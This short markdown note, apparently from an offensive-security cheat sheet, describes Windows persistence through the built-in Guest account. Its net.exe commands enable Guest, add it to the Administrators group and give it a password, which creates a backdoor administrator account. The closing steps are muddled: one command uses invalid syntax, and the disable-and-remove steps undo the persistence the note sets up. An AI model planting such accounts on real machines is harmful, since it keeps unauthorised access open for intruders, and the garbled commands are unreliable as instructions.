# Guest Windows Account Persistence

* Win10 Guest user account is not supported
* If it is not present you can add the account
* If it is, you will need to enable it

```
net user Guest
```

* Now activate it

```
net user Guest /ACTIVE:yes
```

* Add it to the Admins group

```
net localgroup Administrators Guest /add 
```

* Set a password for the now enabled Admin Guest account

```
net user Guest <password>
```

* Disable the Guest Account

```
net localgroup Guest /ACTIVE:no 
```

* Remove from the Administrators group

```
net localgroup Administrators Guest /delete 
```
